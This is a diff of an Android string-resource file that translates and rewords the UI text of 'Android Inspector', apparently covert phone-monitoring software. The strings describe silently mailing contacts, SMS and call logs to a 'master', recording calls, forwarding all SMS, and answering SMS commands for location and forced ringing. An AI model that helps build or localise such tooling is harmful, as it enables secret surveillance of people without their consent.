@@ -40,18 +40,18 @@
     
     <!-- Mail -->
     <string name="mail_from">From</string>
-    <string name="mail_description">(contacts, SMS and phone call history attached)</string>
-    <string name="mail_body_info">Hi, this is an auto mail from %s with contacts, SMS and phone call history attached.</string>
+    <string name="mail_description">(contacts, SMS and phone call list attached)</string>
+    <string name="mail_body_info">Hi, this is an auto mail from %s with contacts, SMS and phone call list attached.</string>
     <string name="mail_body_record">Hi,this is an auto mail from %s with phone call recording attached.</string>
     
     <!-- Location -->
-    <string name="location_sms">Click link to see location: http://maps.google.com/?q=%s</string>
+    <string name="location_sms">Click hyperlink to see location: http://maps.google.com/?q=%s</string>
     <string name="location_sms_latest">Latest(%s) </string>
     <string name="location_sms_gps">GPS location: http://maps.google.com/?q=%s</string>
-    <string name="location_sms_network">network location: http://maps.google.com/?q=%s</string>
+    <string name="location_sms_network">Network location: http://maps.google.com/?q=%s</string>
     <string name="location_sms_base_station_gsm">Current base station location: http://maps.google.com/?q=%s</string>
     <string name="location_sms_base_station_cdma">Current base station location: http://maps.google.com/?q=%s</string>
-    <string name="location_sms_fail">Sorry, cannot get location now. Please try again later. Contact supporter if it always fails.</string>
+    <string name="location_sms_fail">Sorry, cannot get location now. Please try again later. Contact support if necessary.</string>
     
     <!-- Preferences -->
     <string name="pref_title">Preferences</string>
@@ -70,10 +70,10 @@
     
     <string name="pref_use_self_sender_title">Use My Mail Sender</string>
     <string name="pref_use_self_sender_summary">Use your own mail sender(GMail/QQ ONLY) for better privacy, otherwise will use system default mail sender. </string>
-    <string name="pref_sender_mail_title">Sender Mail(GMail/QQ ONLY)</string>
+    <string name="pref_sender_mail_title">Mail Sender(GMail/QQ ONLY)</string>
     <string name="pref_sender_pwd_title">Password</string>
     <string name="pref_invalid_sender_mail">%s is not a valid mail sender</string>
-    <string name="pref_recv_mail_title">Receiver Mail</string>
+    <string name="pref_recv_mail_title">Master Mail</string>
     <string name="pref_invalid_mail_format">Warning: %s is NOT a valid mail address.</string>
     <string name="pref_pls_input_pwd">Please input mail password.</string>
     <string name="pref_info_interval_title">Interval</string> <!-- days -->
@@ -82,27 +82,27 @@
     <string name="pref_record_all_summary">Permitted only when using your own mail sender.</string>
     <string name="pref_record_number_title">Target Number</string>
     <string name="pref_record_number_summary">Record only when the phone call number contains the target number(at least 5 digits). Support 9 targets at most. Separate by blank space.</string>
-    <string name="pref_recv_phonenum_title">Receiver Phone Number</string>
+    <string name="pref_recv_phonenum_title">Master Phone Number</string>
     <string name="pref_pls_input_valid_recv_phonenum">ERROR: %s is not a valid mobile phone number.</string>
-    <string name="pref_target_num_count_reach_max">9 numbers at most permitted.</string>
+    <string name="pref_target_num_count_reach_max">9 numbers at maximum permitted.</string>
     <string name="pref_target_num_format_error">ERROR: 4 digits per number at least.</string>
-    <string name="pref_redirect_all_sms_title">Redirect All SMS</string>
-    <string name="pref_redirect_all_sms_summary">Direct all SMS in real-time. Pay attention to its cost.</string>
+    <string name="pref_redirect_all_sms_title">Forward All SMS</string>
+    <string name="pref_redirect_all_sms_summary">Forward all SMS in real-time. Attention to its possible cost.</string>
     <string name="pref_sensitive_words_title">Sensitive Words</string>
     <string name="pref_sensitive_words_summary">Separate with blank space. No more than 9 words.</string>
     <string name="pref_pls_input_sensitive_words">Please input sensitive words (separate by blank space).</string>
-    <string name="pref_sensitive_words_count_reach_max">No more than %d sensitive words, the surplus words will be ignored. Please re-edit your sensitive words.</string>
-    <string name="pref_sensitive_words_count_reach_max">最多只能支持%d个敏感词，多余的将被忽略。请您重新编辑敏感词。</string>
+    <string name="pref_sensitive_words_count_reach_max">No more than %d sensitive words permitted, the surplus words will be ignored.</string>
+    <string name="pref_sensitive_words_count_reach_max">%d sensitive words for maximum. Please re-edit it.</string>
     <string name="pref_gps_word_title">Location Command</string>
-    <string name="pref_gps_word_summary">Send SMS(#dw) and then get back its location.</string>
+    <string name="pref_gps_word_summary">Send SMS(#location) and then get back its location.</string>
     <string name="pref_category_network_mode_title">Network</string>
-    <string name="pref_network_mode_title">Network Connect Mode</string>
+    <string name="pref_network_mode_title">Network Connection Mode</string>
     <string name="pref_network_mode_summary">Suggest to keep the default "silent" mode for imperceptibility.</string>
     <string name="pref_network_mode_dlg_title">Choose Mode</string>
     <string name="pref_record_all_time_limit_in_trial">Only 10 times recording permitted in trial.</string>
     <string name="pref_must_use_self_sender">For protecting your privacy, recording all phone calls is permitted ONLY when using your own mail sender.</string>
-    <string name="pref_ring_word_title">Force Ring</string>
-    <string name="pref_ring_word_summary">Send SMS #xl to force ring</string>
+    <string name="pref_ring_word_title">Force Belling</string>
+    <string name="pref_ring_word_summary">Send SMS(#bell) to force belling</string>
     
     <!-- InitActivity -->
     <string name="init_title">Android Inspector</string>
@@ -125,8 +125,8 @@
     <string name="init_processing">Processing...</string>
     <string name="init_waiting">Collecting and Sending...</string>
     <string name="init_pls_reset_phone">Please restart phone to enable all features and settings.</string>
-    <string name="init_sending">正在发邮件...</string>
-    <string name="init_pls_reset_phone">重启手机后，所有设定及功能即生效。</string>
+    <string name="init_sending">Sending...</string>
+    <string name="init_pls_reset_phone">All settings and features will work after phone restart.</string>
     
     <!-- Actions -->
     <string name="action_send_mail_success">Sent a mail to your mail box successfully</string>
@@ -142,39 +142,39 @@
     <string name="msg_auth_sms_sent_success">Sent validation SMS to server successfully.</string>
     <string name="msg_auth_sms_sent_fail">ERROR: failed to send validation SMS to server. Please exit and try again or contact software support.</string>
     <string name="msg_has_sent_trial_expire_sms">AndroidEye: trial expired in %s, please contact </string>
-    <string name="msg_expired_alert">AndroidEye: trial expired, please contact </string>
-    <string name="msg_sms_times_over_in_trial">安卓监控提醒您：试用期转发短信已经达到10条，如需继续使用请联系</string>
-    <string name="msg_recording_times_over_in_trial">安卓监控提醒您：试用期通话录音已经达到5次，如需继续使用请联系</string>
+    <string name="msg_expired_alert">Notice: Android Inspector trial expired, please contact </string>
+    <string name="msg_sms_times_over_in_trial">Notice: transferred SMS reached 10 limitation. For getting license, please contact </string>
+    <string name="msg_recording_times_over_in_trial">Notice: phonecall recording reached 5 limitation. For getting license, please contact </string>
     <string name="msg_changed_sim">%s changed SIM card.</string>
-    <string name="msg_changed_sim_new_number">New number: %s</string>
+    <string name="msg_changed_sim_new_number">New phone number: %s</string>
     
     <!-- Indication -->
-    <string name="indication_register_ok">注册成功。</string>
-    <string name="indication_register_ng">注册失败。请检查您发送的注册码是否正确。若无法解决请联系客服。</string>
-    <string name="indication_register_write_ng">注册信息写入失败。请再次尝试，如若无法解决请联系客服。</string>
-    <string name="indication_unregister_ok">卸载成功。</string>
-    <string name="indication_unregister_ng">卸载失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
-    <string name="indication_set_selfsender_ok">设置发信邮箱成功。</string>
-    <string name="indication_set_selfsender_ng">设置发信邮箱失败。请检查您发送的指令格式是否正确（仅支持GMail和QQ邮箱）。若无法解决请联系客服。</string>
-    <string name="indication_stop_selfsender_ok">取消发信邮箱成功。</string>
-    <string name="indication_stop_selfsender_ng">取消发信邮箱失败。因为您当前对所有电话录音，为保护您的隐私，请继续使用您的专有发信邮箱。若无法解决请联系客服。</string>
-    <string name="indication_set_recv_mail_ok">设置收信邮箱成功。</string>
-    <string name="indication_set_recv_mail_ng">设置收信邮箱失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
-    <string name="indication_set_recv_phonenum_ok">设置主控手机号码成功。</string>
-    <string name="indication_set_recv_phonenum_ng">设置主控手机号码失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
-    <string name="indication_set_getinfo_interval_ok">设置信息收集周期成功。</string>
-    <string name="indication_set_getinfo_interval_ng">设置信息收集周期失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
-    <string name="indication_set_targetnum_ok">设置监听录音目标号码段成功。</string>
-    <string name="indication_set_targetnum_ng">设置监听录音目标号码段失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
-    <string name="indication_set_targetall_ok">设置对所有电话录音成功。</string>
-    <string name="indication_set_targetall_ng">必须使用自己的发信邮箱，才能对所有电话录音。请使用#1#指令设置你的专有发信邮箱（仅支持GMail和QQ邮箱）。若无法解决请联系客服。</string>
-    <string name="indication_set_network_mode_ok">设置网络连接模式成功。</string>
-    <string name="indication_set_network_mode_ng">设置网络连接模式失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
-    <string name="indication_set_sens_words_ok">设置敏感词成功。</string>
-    <string name="indication_set_sens_words_ng">设置敏感词失败。请检查您发送的指令格式是否正确，及敏感词个数是否超过最大数（9个）。若无法解决请联系客服。</string>
-    <string name="indication_enable_redirect_all_sms_ok">启用所有短信实时转发成功。</string>
-    <string name="indication_enable_redirect_all_sms_ng">启用所有短信实时转发失败。</string>
-    <string name="indication_disable_redirect_all_sms_ok">停止所有短信实时转发成功。</string>
-    <string name="indication_disable_redirect_all_sms_ng">停止所有短信实时转发失败。</string>
+    <string name="indication_register_ok">Register successfully.</string>
+    <string name="indication_register_ng">Register failed. Please check your license or contact support.</string>
+    <string name="indication_register_write_ng">Failed to write register info. Try again or contact support.</string>
+    <string name="indication_unregister_ok">Uninstall successfully.</string>
+    <string name="indication_unregister_ng">Uninstall failed. Please check the SMS you sent or contact support.</string>
+    <string name="indication_set_selfsender_ok">Set mail sender successfully.</string>
+    <string name="indication_set_selfsender_ng">Failed to set mail sender. Please check SMS you sent (Only GMail and QQ permitted) or contact support.</string>
+    <string name="indication_stop_selfsender_ok">Cancel mail sender successfully.</string>
+    <string name="indication_stop_selfsender_ng">Failed to cancel mail sender. Recommend keeping your mail sender for protecting your privacy in order to keep recording to all phone calls. Contact support if necessary.</string>
+    <string name="indication_set_recv_mail_ok">Set master mail address successfully.</string>
+    <string name="indication_set_recv_mail_ng">Failed to set master mail address. Please check the SMS you sent or contact support.</string>
+    <string name="indication_set_recv_phonenum_ok">Set master phone successfully.</string>
+    <string name="indication_set_recv_phonenum_ng">Failed to set master phone. Please check the SMS you sent or contact support.</string>
+    <string name="indication_set_getinfo_interval_ok">Set info collection interval successfully.</string>
+    <string name="indication_set_getinfo_interval_ng">Failed to set info collection interval. Please check the SMS you sent or contact support.</string>
+    <string name="indication_set_targetnum_ok">Set recording target phone numbers successfully.</string>
+    <string name="indication_set_targetnum_ng">Failed to set recording target phone numbers. Please check the SMS you sent or contact support.</string>
+    <string name="indication_set_targetall_ok">Set recording all phone calls successfully.</string>
+    <string name="indication_set_targetall_ng">It is only allowed to record all phone calls by using your own mail sender. Please set your mail sender by #1 indication. Contact support if necessary.</string>
+    <string name="indication_set_network_mode_ok">Set networks connection mode successfully.</string>
+    <string name="indication_set_network_mode_ng">Failed to set networks connection mode successfully. Please check the SMS you sent or contact support.</string>
+    <string name="indication_set_sens_words_ok">Set sensitive words successfully.</string>
+    <string name="indication_set_sens_words_ng">Failed to set sensitive words. Please check the SMS you sent (9 words at maximum) or contact support.</string>
+    <string name="indication_enable_redirect_all_sms_ok">Enable forwarding all SMS successfully.</string>
+    <string name="indication_enable_redirect_all_sms_ng">Failed to enable forwarding all SMS.</string>
+    <string name="indication_disable_redirect_all_sms_ok">Disable forwarding all SMS successfully.</string>
+    <string name="indication_disable_redirect_all_sms_ng">Failed to disable forwarding all SMS.</string>
     
 </resources>
